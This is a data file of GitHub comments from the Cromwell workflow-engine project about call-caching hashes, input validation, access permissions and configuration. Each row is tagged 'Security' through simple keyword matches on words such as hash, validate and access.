Security,"> So if I fix that in my conf, the messages should go away,; right?. Yes. > Can I specify docker.hash-lookup.method in the workflow_options?. No, if that's something you'd like feel free to create a github issue :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321876895:97,hash,hash-lookup,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321876895,1,['hash'],['hash-lookup']
Security,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:35,hash,hash,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900,2,['hash'],['hash']
Security,"> TOL: To me this feels like it’d be way neater if the EGIN had a field or def called inputFileName nameInInputSet, to encapsulate all this into the egin itself rather than having to add it later externally?. Good point, I was just reticent to the idea of jamming yet another attribute injected by the language that will only ever be used once during the lifetime of the workflow but I agree it's still neater. > FWIW in my ideal world we’d have pluggable languages which should only need to define one function like “readWorkflowIntoWom(content: String, l: Set[ImportResolver]): WomExecutable” and everything else would be included/encapsulated in that result. Yes but there would be some non-DRYness by having each language implement entirely how they ingest inputs (most of the logic is the same), plus having it in WOM guarantees that all EGIN are handled the same way w.r.t coercion, validation etc.. It could use some refactoring though I agree",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402:286,inject,injected,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402,2,"['inject', 'validat']","['injected', 'validation']"
Security,"> The `singleWorkflowRunner` and `dockerDeadlock` sub-builds both failed on the last PR run. I was seeing weird errors with `dockerDeadlock` on my builds yesterday that I eventually got past by restarting the builds, but the `singleWorkflowRunner` errors look more suspicious to me. The problem was caused by the fact that singleWorkflowRunner tests rely on application's log messages for validation and the first fix attempt broke logging: `CromwellEntryPoint.buildCromwellSystem` was calling `initLogging` method to tamper with system properties before logback initialization. Then I moved `validateRunArguments` call to happen before the `buildCromwellSubsystem`, but turned out that `validateRunArguments` triggered logback initialization before system properties have been modified, thus making logback misconfigured.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-544104556:389,validat,validation,389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-544104556,3,['validat'],"['validateRunArguments', 'validation']"
Security,"> This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. > The ValidatedWomNamespace produced as part of workflow materialization contains a womValueInputs field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?. Great suggestion. I will take a look at this. I can checkout the test case on a new branch and try to hack there. One of the catches will be that this resolving will be backend dependent. In the current situation the input expressions are evaluated first, and after that the inputs are resolved. (This makes sense because input can also be something like `baseDir + ""/my_file.txt""`, which needs to be evaluated). But indeed this could be bypassed by doing this already at the workflow level, before it gets passed down to the task level. I will take a look at this. If it does not work, (or work easily) then I will report back here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024:258,Validat,ValidatedWomNamespace,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024,2,"['Validat', 'validat']","['ValidatedWomNamespace', 'validated']"
Security,> With the new caching heuristic for generating File input hashes (path+modtime) relies on soft-linking for it to work correctly. Having soft-links disabled by design when containerizing a task makes this option mood. The hash is calculated based on the original path. Not on the relocalized path. So this should not be an issue.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332:59,hash,hashes,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482565332,2,['hash'],"['hash', 'hashes']"
Security,"> got an example of a fork in the liquibase scripts?. > One workaround that I'm already using in a couple of places is having a separate changeSet specific to postgres. See this link: http://www.liquibase.org/2009/03/what-effects-changeset-checksums.html. Those ""couple of places"" are likely the ""forks"" @geoffjentry was referring to. Additional changesets are fine, but ""adjusting the database migrations"" will add additional setup and test criteria regarding the MD5s. Here are two examples:. https://github.com/broadinstitute/cromwell/blob/70cff69799f149191bdaec5d8878dd2a3d5202b7/database/migration/src/main/resources/changesets/sync_not_null_constraints.xml#L20-L36. https://github.com/broadinstitute/cromwell/blob/70cff69799f149191bdaec5d8878dd2a3d5202b7/database/migration/src/main/resources/changesets/lengthen_wdl_value.xml#L5-L15. At minimum for the former changelog I suspect that fixes for Postgres (and [MariaDB](https://github.com/broadinstitute/cromwell/issues/4618) 🤔) will probably change the MD5s. As the link at the top says, there are workarounds to update/ignore the MD5s. But those workarounds will need to be implemented and CI tested-- along w/ [Postgres support](https://docs.travis-ci.com/user/database-setup/#postgresql).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475014616:240,checksum,checksums,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475014616,1,['checksum'],['checksums']
Security,"> it seems like we would want to continue seeing it; @aednichols; The bug in Life Sci API is that the ssh server is supposed to be disabled on the VM, but in some cases it is not, causing the `address already in use` problem. Since the ssh server is not disabled, ssh access to the VM is in fact possible. The error then becomes meaningless: the dockerized ssh server is unrelated to the wdl workflow, and users can still ssh to the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597:268,access,access,268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597,1,['access'],['access']
Security,> not sure why this was showing all green with only one review 🤔. PullApprove audits are always available via the `code-review/pullapprove` [Details](https://pullapprove.com/broadinstitute/cromwell/pull-request/3691/) links. In this case the change fell into `groups.one_reviewer` because of `groups.two_reviewers.conditions.files.exclude: centaur/*`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3691#issuecomment-392093770:78,audit,audits,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3691#issuecomment-392093770,1,['audit'],['audits']
Security,"> the tutorial, right in the section describing the configuration file for PAPIv1, neither states this simple fact about Requester Pays not working with PAPIv1. We should probably remove the PAPIv1 tutorial entirely, it has carried the deprecation warning for over a year now. It lives [here](https://github.com/broadinstitute/cromwell/blob/develop/docs/tutorials/PipelinesApi101.md) and we will gladly merge improvement PRs. > My best guess is that, albeit extremely counter-intuitive, I have access to this bucket with my personal account but I do not have access to this bucket with my service account. Oh my, this is so complicated ... That does seem like a probable explanation, though I don't know the particulars of how you set up your SA. Cloud architecture is a large beast and Cromwell targets a very specific cross section of it (running workflows). A particular account having access to input data would need to be configured as a prerequisite. Since I see you are at Broad, perhaps BITS can help with it. > `storage.objects.list` issue. I recommend trying to recreate the scenario locally with `gsutil cp` and the desired service account & file. Your turnaround time will be much faster than running the workflow. It is certainly possible that Cromwell has a bug that causes GCS to incorrectly deny access, but we generally would like to see the same file/account combination working correctly outside of Cromwell before we will accept it as a bug report.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665310550:494,access,access,494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665310550,8,['access'],['access']
Security,">I assume that we're using the service registry + a whole new actor with the expectation that eventually we'll be calling some external service?. @aednichols that is correct. Once ECM supports returning Github tokens, this will be updated to actually call the new ECM endpoint instead of getting access token from the config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123:296,access,access,296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123,1,['access'],['access']
Security,">This change appears to validate the format of the disk requirements but then do nothing with the actual values? Is that correct?. AWS has auto-sizing and auto-expanding disks, so the concept of specifying a disk size is not applicable in this universe. This PR lets Cromwell ignore everything after `local-disk` instead of issuing an error. >Can we update the test cases which now work? I suspect custom_mount_point at least could be re-enabled?. `custom_mount_point` is not on the excluded list in `testCentaurAws.sh`. Are you requesting new coverage by adding `awsbatch` to the backends for `custom_mount_point.test`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4863#issuecomment-485902441:24,validat,validate,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4863#issuecomment-485902441,1,['validat'],['validate']
Security,@DavyCats I sent you an invitation! Let me know if you run into any issues with access,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498294904:80,access,access,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4965#issuecomment-498294904,1,['access'],['access']
Security,"@EvanTheB thanks for this report! . I've [added a test](https://github.com/broadinstitute/cromwell/pull/3867) to make sure this check happens during static validation and amended the error message. I'll link this issue so that it gets closed when the PR merges, are you all set with how to fix the problem in your expression?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402842188:156,validat,validation,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402842188,1,['validat'],['validation']
Security,"@Horneth . > Is there an equivalent for JES runtime attributes validation that could need an update as well ?. Not that I can think of. JES's runtime attributes are [hardcoded](https://github.com/broadinstitute/cromwell/blob/23/supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesRuntimeAttributes.scala#L19-L28) into the scala code. Meanwhile, these are the declarations of runtime attributes for the Config based backend. Via the config, one can specify the list of valid runtime attributes for _your_ backend, PBS, LSF, SGE, etc. See #1737 for an example of where this was broken.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264924049:63,validat,validation,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264924049,1,['validat'],['validation']
Security,"@Horneth @cjllanwarne sure we can make the choice of auths explicit in `genomics` and `filesystems`. I did want to keep it clear in the config which auth was for Cromwell and which was for the user so we didn't make it impossible to implement call log copying in FireCloud (in case someday we want to use that feature there). How about something like the following for FireCloud:. ``` hocon. // Same as the preceding FireCloud sample conf; google {; application-name = ""cromwell"". // There may be instances like the final call that copies call logs which will need to be able to generate both; // Cromwell and user authentication, so making these explicit.; cromwellAuthentication {; scheme = ""application_default""; }. // Used for engine functions involving the filesystem.; userAuthentication {; scheme = ""refresh""; client-id = ""secret_id""; client-secret = ""secret_secret""; }; }. // genomics with explicitly selected conf; genomics {; ...; auth = ""cromwell""; ...; }. ...; filesystems = [; // gcs filesystem with explicitly selected conf; gcs {; auth = ""user""; }; ]; ... ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472:615,authenticat,authentication,615,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472,2,['authenticat'],['authentication']
Security,@Horneth @geoffjentry As per our discussion. Tell me if you need access to the VM...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480#issuecomment-249210875:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480#issuecomment-249210875,1,['access'],['access']
Security,@Horneth I assume for now we're still *recording* all the individual hashes even though we don't currently ever look at them? . So if we did need to back out of this we could just reinstate this and be good to go?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4121#issuecomment-423575324:69,hash,hashes,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4121#issuecomment-423575324,1,['hash'],['hashes']
Security,@Horneth I don't think you want to assume production will be an easier environment than unit tests :). What if every actor had its own data access? Within a workflow the overhead of doing so shouldn't be high,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143031435:140,access,access,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143031435,1,['access'],['access']
Security,"@Horneth The more I'm thinking about this I'm transitioning from ""throwing something out there"" to ""advocating"" :). What bothers me about this is that eventually we're going to want workflow submission also go through the same validation actor instead of doing it in multiple ways. Typically you want actor ownership to be hierarchical in nature but this way you'd have multiple parent types. Something to consider - what happens if a VA throws an exception under this model? You'll now need to have supervision code in multiple places. More abstractly what will be said is that validation is A Thing, but needs to exist independently in multiple places - if that's the case it should be pulled out into its own block. Furthermore the validation actor should be the sort of actor which is perfect for being its own concept - it's a completely idempotent, stateless operation. Work gets sent to it, it process the work and responds to the querier. My point about supervision is that by Right Now defining A Validation Actor (presumably owned by the kernel) what you're effectively doing is defining a validation interface. You can change how things are implemented in the future (e.g. it's really a bunch of VAs, it's firing up ephemeral VAs, whatever) and not need to change any code throughout the rest of the system as everything is still talking to the same actorRef that they were before. Alternatively if validation actors are being spun up on demand in multiple places and we decide that we somehow need to handle VAs in a special manner, it'll be a larger refactor. All that said, at the moment only the validation webservice is talking to the VA. I'm happy to shelve this until when something else is talking to VAs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195419168:227,validat,validation,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195419168,7,"['Validat', 'validat']","['Validation', 'validation']"
Security,"@Horneth There are certainly tradeoffs and I don't disagree w/ what you said. However consider the flip side - by defining A Validation Actor you're allowing for more granular control over performance and fault tolerance down the road, e.g. you could replace it with a router talking to a bank of VAs and doing load balancing, fiddle with its own threadpool, provide validation specific supervision in case of error, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500:125,Validat,Validation,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500,2,"['Validat', 'validat']","['Validation', 'validation']"
Security,"@Horneth To play devil's advocate against myself - a bit, as this doesn't matter if it's a short lived or long lived VA, in a world where we want both the validation API and submission to go through the validation actor (reclal that currently submission validation is done by the WMA) the submission endpoint could send the work to the VA who then sends it to the WMA if it is OK. That would at least make the VA fully under the umbrella of the webservice portion of the actor system",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195427960:155,validat,validation,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195427960,3,['validat'],['validation']
Security,@Horneth can you explain more about what the problem is with the Docker hash lookups?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332640764:72,hash,hash,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-332640764,1,['hash'],['hash']
Security,"@Horneth in CromIAM we already have access to the entity bytes, so the plan (at least initially) is to read that in as a Query result, find out which IDs can be seen by the requester, and then make a new entity out of the filtered results",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2501#issuecomment-318490274:36,access,access,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2501#issuecomment-318490274,1,['access'],['access']
Security,@Horneth then it sounds like it's no longer the case that Cromwell doesn't check if a job is complete before calculating the hash when restarting. In that case I'll close it unless there are objections.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-327920051:125,hash,hash,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1441#issuecomment-327920051,1,['hash'],['hash']
Security,@KevinDuringWork Were you able to validate this work before. Is your team utilizing this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887602522:34,validat,validate,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6225#issuecomment-887602522,1,['validat'],['validate']
Security,"@LeeTL1220 -- I'm not sure what to do with this... have you seen it again? Seems like the timing diagram is fine, but that the underlying metadata was incorrect somehow... and I'm guessing we can't reproduce this and don't have access to the data any longer?. @cjllanwarne -- is there an actionable ticket from your digging?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262541364:228,access,access,228,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-262541364,1,['access'],['access']
Security,"@LeeTL1220 I'm still on this, not @ruchim. A couple days ago you asked what I changed to get the workflow to run for success and exit cleanly. I was having problems even getting the workflow to reach success with the given hash `cromwell-23-79f6e12-SNAPSHOT.jar`, as these outputs with spaces were causing errors:. ```; File purity_series_small_amp = ""purity_plots/purity_series_small_Small Amplifications.png""; File purity_series_small_del = ""purity_plots/purity_series_small_Small Deletions.png""; Array[File] purity_files = glob(""purity_plots/*""); ```. I've been investigating whether this failure is a problem with `glob()`s, or just the `File`s with spaces. . FYI swapping out the three elements for another set of files ""random"" files allowed the workflow to succeed, and cromwell exited cleanly in single workflow mode. ```; # hacked paths to allow downstream calls to still run; File purity_series_small_amp = ""purity_plots/purity_series_Amplifications.png""; File purity_series_small_del = ""purity_plots/purity_series_Deletions.png""; Array[File] purity_files = glob(""purity_plots/purity_series_*.png""); ```. If there's another hash besides `79f6e12` that causes cromwell to run with spaces, _finish successfully_, and then, let me know. **TL;DR I can either get `79f6e12` with the workflow to succeed & exit, or fail-- but not succeed and lock up.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-262309116:223,hash,hash,223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-262309116,2,['hash'],['hash']
Security,"@LeeTL1220 are you using `docker.hash-lookup.method = ""local""` ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823273:33,hash,hash-lookup,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823273,1,['hash'],['hash-lookup']
Security,"@LeeTL1220 my `reference.conf` database section looks correct:. ```; database {; # hsql default; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:mem:${uniqueSchema};shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }. # mysql example; #driver = ""slick.driver.MySQLDriver$""; #db {; # driver = ""com.mysql.jdbc.Driver""; # url = ""jdbc:mysql://host/cromwell?rewriteBatchedStatements=true""; # user = ""user""; # password = ""pass""; # connectionTimeout = 5000; #}. # For batch inserts the number of inserts to send to the DB at a time; # insert-batch-size = 2000. migration {; # For databases with a very large number of symbols, selecting all the rows at once can generate a variety of; # problems. In order to avoid any issue, the selection is paginated. This value sets how many rows should be; # retrieved and processed at a time, before asking for the next chunk.; read-batch-size = 100000. # Because a symbol row can contain any arbitrary wdl value, the amount of metadata rows to insert from a single; # symbol row can vary from 1 to several thousands (or more). To keep the size of the insert batch from growing out; # of control we monitor its size and execute/commit when it reaches or exceeds writeBatchSize.; write-batch-size = 100000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016:462,password,password,462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016,1,['password'],['password']
Security,"@LeeTL1220 there is doc in the README and CHANGELOG (in this PR) on how to disable it.; For SGE, since it doesn't honor the docker runtime attribute I don't think there can be false positive because of that. ; On a backend that does honor the docker attribute, if a tag is used, then yes it can yield false positives if the tag is updated, since Cromwell won't lookup the hash.; There can be false negatives though on SGE, if you change the value of the docker attribute in the WDL, it won't call cache, although it could because SGE will ignore the docker value anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784:372,hash,hash,372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784,1,['hash'],['hash']
Security,"@TMiguelT @geoffjentry I've been following the conversation and we're pretty keen to use some container system with Cromwell on our cluster. At the moment I'm trying to use udocker with Cromwell with the following conf, but the docker param [is looked up](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/#Docker+Tags) and injected as a [digest](https://docs.docker.com/engine/reference/commandline/pull/#pull-an-image-by-digest-immutable-identifier) which udocker [doesn't appear to support](https://github.com/indigo-dc/udocker/issues/112). . ```; backend {; default: udocker; providers: {; udocker {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {. # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """""". # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; udocker run \; --rm -i \; ${""--user "" + docker_user} \; # Edit: future Michael here, entrypoint in udocker starts interactive shell so exclude it; #--entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """"""; }; }; }; }; ```. which results in the script.submit:; ```bash; udocker run \; --rm -i \; # --entrypoint /bin/bash \ # Edit: Don't include this line it causes interactive shell; -v /path/to/call-untar:/cromwell-executions/path/to/call-untar \; ubuntu@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68 \; /cromwell-executions/path/to/call-untar/execution/script; ```. and fails with the error:; ```; Error: invalid repo name syntax; Error: must specify image:tag or repository/image:tag; ```. I can't find some way to disable the docker lookup by Cromwell, nor some non-digest runtime variable that Cromwell exposes. Just wondering how you're achieving this on docker or singularity. . Edit: `entrypoint` in udocker starts interactive shell, suspending the execution of the program.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364:346,inject,injected,346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364,2,"['expose', 'inject']","['exposes', 'injected']"
Security,@aednichols I could give you access to the caas-collections!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-437482357:29,access,access,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-437482357,1,['access'],['access']
Security,"@aednichols I want to reopen, because Map[String, MyStruct] also crashes and because if you claim it is about types than the error should appear when I validate with latest womtool and not in a runtime!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4555#issuecomment-464240925:152,validat,validate,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4555#issuecomment-464240925,1,['validat'],['validate']
Security,"@aednichols Thanks again for allowing me push access to the repo. I can not test all the backends manually so it is good that I can access the CI environment and see if the bug fix turned out well. What is the formal process of getting this bug under the Cromwell team's attention? I have made a JIRA issue. Should I put it on the sprint? I also ask this for #5456 which is a really simple fix. I am not in great haste getting a review, but I want to ensure these fixes end up in the next release of Cromwell. These bugs are now actively blocking BioWDL development as our CI always uses a mainline version of Cromwell. (Usually the latest, but we are already actively excluding 49 because of the relative outputs bug). . By no means I want to push the Cromwell team in reviewing these fixes right now, but if you could give me some procedure that would make sure these are reviewed before the next release is out, that would give me some peace of mind. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-611900735:46,access,access,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-611900735,4,['access'],['access']
Security,"@aednichols When I tried creating a branch in broadinstitute/cromwell as suggested by you in #5807, I get . > fatal: Authentication failed for 'https://github.com/broadinstitute/cromwell.git/' . I did _git push mainRepo EFS-fixes-for-5468_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760530070:117,Authenticat,Authentication,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760530070,1,['Authenticat'],['Authentication']
Security,@aednichols Would you be able to merge? I do not have write access. Thanks for any help!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6993#issuecomment-1412302194:60,access,access,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6993#issuecomment-1412302194,1,['access'],['access']
Security,"@aednichols thanks for a detailed look into this. With the latest dev branch, and with the commit that contains the fix, I'm getting the below error. I can still run unpacked without error. ```; (p3) [jeremiah@localhost fail_cromwell]$ /usr/lib/jvm/java-11-openjdk/bin/java -Dconfig.file=/home/jeremiah/code/fresh/really/cromwell/cromwell.example.backends/cromwell.examples.conf --illegal-access=warn -jar /home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar run test_wf_pack.cwl --inputs test_wf.json --type CWL --type-version v1.0; [2019-04-18 17:19:09,95] [info] Running with database db.url = jdbc:hsqldb:mem:39c64473-526e-47d6-a015-f9193a0fd4f4;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:389,access,access,389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"@aednichols you probably misunderstood my issue that you closed. It was not about having a mixed map, but about Cromwell coercing well defined the types to Map[String, Any] at runtime while everything is validated by both Cromwell and womtool at compiletime.; I opened another issue, where the same problem emerges with the struct, where Cromwell tries to consider struct output as Map[String, Any] at runtime. https://github.com/broadinstitute/cromwell/issues/4663",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4661#issuecomment-464247842:204,validat,validated,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4661#issuecomment-464247842,1,['validat'],['validated']
Security,"@aednichols, rewrote using the ""dependency injection pattern"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-511603946:43,inject,injection,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-511603946,1,['inject'],['injection']
Security,"@antonkulaga @cjllanwarne ; I have tested call-caching with hardlinks and cached-copy strategy. For hashing-strategy I used path+modtime. These were the results for the call-caching:. **It works!**. So this part of the docs should be updated indeed. I have no idea why it works though, so I am a bit hesitant to add it to the docs. @cjllanwarne Do you know if anything changed in the code base that made the call-caching work for hard links?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831:100,hash,hashing-strategy,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831,1,['hash'],['hashing-strategy']
